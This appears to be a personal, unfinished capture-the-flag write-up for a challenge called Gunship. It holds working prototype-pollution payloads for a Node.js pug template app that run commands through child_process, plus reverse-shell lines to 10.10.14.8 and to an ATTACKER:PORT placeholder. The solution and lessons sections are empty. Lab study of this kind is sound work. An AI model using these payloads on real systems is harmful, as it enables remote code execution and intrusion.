
# <span style="color:[COLOR]">Challenge #1 Gunship</span>  


## <span style="color:[COLOR]">Notes During Working on the Machine 🧐🤓   
* Imma try and gobuster it see if I find anything or maybe try using feroxbuster. Maybe check a word list specifically for apis.  
* There is no need to brute force directories I found an RCE exploit but it kept giving me command failed.
* Anyway the backend is nodejs.

  ```js
  Object.prototype.block = {"type": "Text", "line": "console.log(process.mainModule.require('child_process').execSync('id').toString())"};
  ```

  ```json
  "Haigh {'__proto__.block': {'type': 'Text','line': 'process.mainModule.require(\'child_process\').execSync(\'whoami\', function puts(error, stdout, stderr) {})'}}"

  {
      "__proto__.block": {
          "type": "Text", 
          "line": "process.mainModule.require('child_process').execSync('whoami', function puts(error, stdout, stderr) {})"
  }}
  ```

  ```json
  {
      "artist.name": "Haigh;console.log(process.mainModule.require('child_process').execSync('id').toString())"
  }
  ```

  ```
  //pug
  "__proto__.block": {
          "type": "Text", 
          "val": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/10.10.14.8/1234 0>&1'`)"
      }
  ```

  ```js
  process.mainModule.require('child_process').execSync('sleep 10');
  var c = require('child_process');
   c.exec("mkfifo .s");
   c.exec("/bin/sh -i < .s 2>&1 | openssl s_client -quiet -connect ATTACKER:PORT > .s");
   c.exec("rm .s");
  var c = process.mainModule.require('child_process'); c.exec("mkfifo.s");c.exec("/bin/sh -i < .s 2>&1 | openssl s_client -quiet -connect ATTACKER:PORT > .s");c.exec("rm .s");
  ```   

* When I tried the command `sleep 10` into the `execSync` function it worked without any errors so I have to look into what command I should really provide.
* I'm not sure if I should get a reverse shell or is it another way. Because if I need to spawn a reverse shell what should I put my ip address since this is not a machine that I have on my "private network".

<br/><br/>



## <span style="color:[COLOR]">How Did I Solve the Challenge 😎🥳 


<br/><br/>






## <span style="color:[COLOR]">What Did I learn from this Machine?👀  


<br/><br/>



## <span style="color:[COLOR]">Writeups ✍🏽📓   


<br/><br/>


<!-- @nested-tags:EXAMPLE/OF/NESTED/TAGS-->